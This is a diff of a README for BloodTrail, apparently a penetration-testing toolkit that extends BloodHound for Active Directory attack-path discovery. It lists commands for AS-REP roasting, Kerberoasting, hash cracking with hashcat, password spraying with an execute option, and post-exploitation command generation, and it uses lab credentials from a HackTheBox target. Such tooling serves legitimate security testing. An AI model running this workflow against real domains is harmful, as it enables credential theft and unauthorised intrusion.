@@ -1,121 +1,140 @@
-# BloodTrail - BloodHound Attack Path Enhancement
+# BloodTrail
 
-Edge enhancement, credential pipeline, and Cypher query analysis for BloodHound/Neo4j.
+Active Directory attack path discovery and exploitation toolkit. Extends BloodHound with pre-auth enumeration, credential pipelines, and automated command generation.
 
 ## Features
 
-- **Credential Pipeline**: Bridge enumeration and BloodHound with `--creds` integration
-- **Anonymous Enumeration**: Auto-detect AS-REP roastable users, Kerberoastable SPNs
-- **Edge Enhancement**: Import missing edges (AdminTo, GenericAll, MemberOf, etc.) from SharpHound JSON exports
-- **Query Library**: 63+ pre-built Cypher queries for attack path discovery
-- **ZIP Support**: Process SharpHound ZIP output directly (no extraction needed)
-- **Command Suggestions**: Auto-suggest exploitation commands based on discovered paths
-- **Pwned Tracking**: Track compromised users and their access paths in Neo4j
+| Feature | Description |
+|---------|-------------|
+| Pre-Auth Enumeration | AS-REP roasting, Kerberoasting, password policy discovery |
+| Credential Pipeline | Validate → Collect → Import → Mark Pwned → Query |
+| Edge Enhancement | Import missing edges from SharpHound exports |
+| Query Library | 63+ Cypher queries for attack path discovery |
+| Pwned Tracking | Track compromised users and access paths in Neo4j |
+| Command Generation | Auto-suggest exploitation commands for discovered paths |
+| Password Spraying | Policy-aware spraying with lockout protection |
 
 ## Quick Start
 
 ```bash
-# Anonymous enumeration (AS-REP, Kerberoasting detection)
+# Anonymous enumeration
 crack bloodtrail 10.10.10.161
 
-# Feed cracked credentials back in (full pipeline)
+# With credentials (auto-validates, collects BloodHound, marks pwned)
 crack bloodtrail 10.10.10.161 --creds svc-alfresco:s3rvice
 
-# Enhance edges from SharpHound ZIP
-crack bloodtrail /path/to/sharphound_output.zip --preset attack-paths
-
-# List available queries
-crack bloodtrail --list-queries
+# Import existing SharpHound data
+crack bloodtrail /path/to/sharphound.zip
 
 # Resume with existing Neo4j data
 crack bloodtrail -r
+
+# Mark user pwned and view attack paths
+crack bloodtrail --pwn 'USER@DOMAIN.COM' --cred-type password --cred-value 'secret'
 ```
 
-## Credential Pipeline (`--creds`)
+## Command Reference
 
-The credential pipeline bridges anonymous enumeration with authenticated BloodHound collection:
-
-```
-Parse → Validate → Collect → Import → Mark Pwned → Query Attack Paths
-```
-
-### Usage
+### Enumeration (Pre-Auth)
 
 ```bash
-# Inline credential (user:pass)
-crack bloodtrail 10.10.10.161 --creds svc-alfresco:s3rvice
-
-# With domain prefix
-crack bloodtrail 10.10.10.161 --creds 'htb.local/svc-alfresco:s3rvice'
-
-# From credentials file (one per line)
-crack bloodtrail 10.10.10.161 --creds ./creds.txt
-
-# Auto-detect hashcat/john potfile
-crack bloodtrail 10.10.10.161 --use-potfile
-
-# NTLM hash (auto-detected by 32 hex chars)
-crack bloodtrail 10.10.10.161 --creds 'admin:aad3b435b51404eeaad3b435b51404ee'
+crack bloodtrail <IP>                        # Anonymous enumeration
+crack bloodtrail <IP> -u user -p pass        # Authenticated
+crack bloodtrail <IP> --domain corp.local    # Specify domain
+crack bloodtrail --list-enumerators          # Show available tools
 ```
 
-### Pipeline Options
+Discovers: AS-REP roastable users, Kerberoastable SPNs, password policy, domain users/groups.
 
-| Flag | Description |
-|------|-------------|
-| `--creds CREDS` | Inline credential or path to credentials file |
-| `--creds-file FILE` | Explicit credentials file path |
-| `--use-potfile` | Auto-detect hashcat/john potfile |
-| `--potfile-path FILE` | Custom potfile path |
-| `--skip-validate` | Skip credential validation (trust creds) |
-| `--no-collect` | Skip BloodHound collection (use existing data) |
+### Credential Pipeline
+
+```bash
+crack bloodtrail <IP> --creds user:pass              # Inline
+crack bloodtrail <IP> --creds 'DOMAIN/user:pass'     # With domain
+crack bloodtrail <IP> --creds-file ./creds.txt       # From file
+crack bloodtrail <IP> --use-potfile                  # From hashcat potfile
+crack bloodtrail <IP> --creds 'user:<NTLM_HASH>'     # NTLM hash (auto-detected)
+```
+
+Pipeline: `Parse → Validate → Collect → Import → Mark Pwned → Query`
+
+| Flag | Effect |
+|------|--------|
+| `--skip-validate` | Skip credential validation |
+| `--no-collect` | Skip BloodHound collection |
 | `--no-pwn` | Skip marking users as pwned |
-| `--no-import` | Skip Neo4j import |
-| `--bh-output DIR` | BloodHound output directory |
 
-### Credential Formats
-
-```
-user:password              # Basic
-domain/user:password       # Domain prefix (NTLM style)
-user@domain:password       # UPN style
-user:aad3b435b51404ee...   # NTLM hash (auto-detected)
-```
-
-## Anonymous Enumeration
-
-Target an IP to run pre-auth enumeration:
+### BloodHound Import
 
 ```bash
-# Basic enumeration
-crack bloodtrail 10.10.10.161
-
-# With verbose output
-crack bloodtrail 10.10.10.161 -v
-
-# Specify domain
-crack bloodtrail 10.10.10.161 --domain htb.local
-
-# Authenticated enumeration
-crack bloodtrail 10.10.10.161 -u admin -p Password123
+crack bloodtrail /path/to/sharphound.zip     # Import ZIP
+crack bloodtrail /path/to/bh_data/           # Import directory
+crack bloodtrail /path --preset attack-paths # High-value edges only
+crack bloodtrail /path --validate            # Validate without import
+crack bloodtrail --list-edges                # Show supported edge types
 ```
 
-Discovers:
-- AS-REP roastable users (DONT_REQ_PREAUTH)
-- Kerberoastable accounts (SPNs)
-- Password policy
-- Domain users and groups
+### Query Library
 
-## Presets
+```bash
+crack bloodtrail --list-queries              # List all 63+ queries
+crack bloodtrail --search-query kerberos     # Search by keyword
+crack bloodtrail --run-query find-asrep      # Execute single query
+crack bloodtrail --run-all                   # Run all, generate report
+crack bloodtrail --install-queries           # Install to BloodHound GUI
+```
 
-- `attack-paths`: High-value attack path edges (AdminTo, DCSync, GenericAll)
-- `all`: All available edge types
-- `minimal`: Essential edges only
+### Pwned User Tracking
+
+```bash
+crack bloodtrail --pwn 'USER@DOMAIN.COM' --cred-type password --cred-value 'secret'
+crack bloodtrail --pwn-interactive           # Interactive mode
+crack bloodtrail --list-pwned                # List all pwned users
+crack bloodtrail --pwned-user USER           # User details + commands
+crack bloodtrail --unpwn USER                # Remove pwned status
+crack bloodtrail --cred-targets              # Credential harvest targets
+crack bloodtrail --post-exploit              # Post-exploitation commands
+crack bloodtrail --recommend                 # Attack path recommendations
+```
+
+### Domain Configuration
+
+```bash
+crack bloodtrail --show-config               # Show stored config
+crack bloodtrail --dc-ip 10.10.10.1          # Set DC IP
+crack bloodtrail --domain-sid S-1-5-21-...   # Set domain SID
+crack bloodtrail --lhost 10.10.14.5 --lport 443  # Callback config
+crack bloodtrail --discover-dc user pass     # Auto-discover DC
+crack bloodtrail --clear-config              # Clear config
+crack bloodtrail --purge                     # Purge all Neo4j data
+```
+
+### Password Policy & Spraying
+
+```bash
+# Policy
+crack bloodtrail --set-policy                # Import from 'net accounts'
+crack bloodtrail --set-policy policy.txt     # From file
+crack bloodtrail --show-policy               # Display policy
+crack bloodtrail --clear-policy              # Clear policy
+
+# Spraying
+crack bloodtrail --spray                     # Spray recommendations
+crack bloodtrail --spray-tailored            # BloodHound-based targeting
+crack bloodtrail --auto-spray                # Generate spray scripts
+crack bloodtrail --auto-spray --execute      # Execute with confirmation
+```
 
 ## Neo4j Connection
 
-Default connection: `bolt://localhost:7687`
+Default: `bolt://localhost:7687`
 
-Configure via environment or `~/.crack/config.json`:
+```bash
+# CLI override
+crack bloodtrail --uri bolt://host:7687 --user neo4j --password secret
+```
+
+Config file (`~/.crack/config.json`):
 ```json
 {
   "bloodtrail": {
@@ -126,23 +145,100 @@ Configure via environment or `~/.crack/config.json`:
 }
 ```
 
+## Example Workflow
+
+```bash
+# 1. Anonymous enumeration - find AS-REP roastable users
+crack bloodtrail 10.10.10.161
+
+# 2. AS-REP roast discovered user
+impacket-GetNPUsers -dc-ip 10.10.10.161 -request -no-pass htb/svc-alfresco
+
+# 3. Crack the hash
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+
+# 4. Feed credentials back (validates, collects BloodHound, marks pwned)
+crack bloodtrail 10.10.10.161 --creds svc-alfresco:s3rvice
+
+# 5. View attack paths from pwned user
+crack bloodtrail --pwned-user 'SVC-ALFRESCO@HTB.LOCAL'
+
+# 6. Get exploitation commands
+crack bloodtrail --post-exploit
+```
+
+## Output Files
+
+Generated in working directory or next to imported data:
+
+| File | Contents |
+|------|----------|
+| `bloodtrail.md` | Full attack path report |
+| `users_all.txt` | All discovered users |
+| `users_real.txt` | Non-service accounts (spray targets) |
+| `asrep_targets.txt` | AS-REP roastable users |
+| `kerberoast_targets.txt` | Users with SPNs |
+| `computers.txt` | Computer names |
+| `domain_info.txt` | Domain summary |
+
 ## Architecture
 
 ```
 bloodtrail/
-├── cli.py               # CLI interface
-├── main.py              # BHEnhancer core logic
-├── credential_input.py  # Credential parsing (inline, file, potfile)
-├── creds_pipeline.py    # Credential pipeline orchestration
-├── extractors.py        # Edge extraction from JSON
-├── query_runner.py      # Cypher query execution
-├── command_suggester.py # Attack path → command mapping
-├── pwned_tracker.py     # Pwned user tracking in Neo4j
-├── enumerators/         # Pre-auth enumeration plugins
-│   ├── base.py          # Enumerator ABC
-│   ├── enum4linux.py    # SMB/RPC enumeration
-│   ├── ldapsearch.py    # LDAP enumeration
-│   └── kerbrute.py      # Kerberos user enumeration
-├── cypher_queries/      # Pre-built query library
-└── mappings/            # Edge and credential type mappings
+├── cli/                      # Command-line interface
+│   ├── base.py              # BaseCommandGroup ABC
+│   ├── parser.py            # Argument parser
+│   ├── interactive.py       # Interactive helpers
+│   └── commands/            # Command handlers
+│       ├── query.py         # --list-queries, --run-query, --run-all
+│       ├── pwned.py         # --pwn, --list-pwned, --post-exploit
+│       ├── config.py        # --dc-ip, --show-config, --purge
+│       ├── policy.py        # --set-policy, --show-policy
+│       ├── spray.py         # --spray, --auto-spray
+│       ├── creds.py         # --creds, --use-potfile
+│       ├── enumerate.py     # IP address mode
+│       └── import_data.py   # Path/ZIP import mode
+│
+├── core/                     # Shared utilities
+│   ├── models.py            # Query, QueryResult dataclasses
+│   ├── formatters.py        # Display formatting
+│   ├── neo4j_connection.py  # Connection management
+│   └── query_loader.py      # JSON query loading
+│
+├── enumerators/              # Pre-auth enumeration plugins
+│   ├── enum4linux.py        # SMB/RPC enumeration
+│   ├── ldapsearch.py        # LDAP enumeration
+│   ├── kerbrute.py          # Kerberos user enum
+│   └── getnpusers.py        # AS-REP roasting
+│
+├── autospray/                # Password spray automation
+│   ├── executor.py          # Spray execution
+│   ├── lockout.py           # Lockout protection
+│   └── sources.py           # Credential sources
+│
+├── display/                  # Output formatting
+│   ├── tables.py            # Table rendering
+│   ├── attack_paths.py      # Attack path display
+│   └── post_exploit.py      # Post-exploitation commands
+│
+├── cypher_queries/           # Query library (JSON)
+│   ├── quick_wins.json
+│   ├── lateral_movement.json
+│   ├── privilege_escalation.json
+│   └── attack_chains.json
+│
+├── main.py                   # BHEnhancer core
+├── query_runner.py           # Cypher execution
+├── report_generator.py       # Report generation
+├── pwned_tracker.py          # Pwned user tracking
+├── command_suggester.py      # Command generation
+└── creds_pipeline.py         # Credential pipeline
 ```
+
+## Testing
+
+```bash
+python -m pytest tests/tools/post/bloodtrail/ -v
+```
+
+797 tests covering credential parsing, spray execution, query handling, and Neo4j integration.
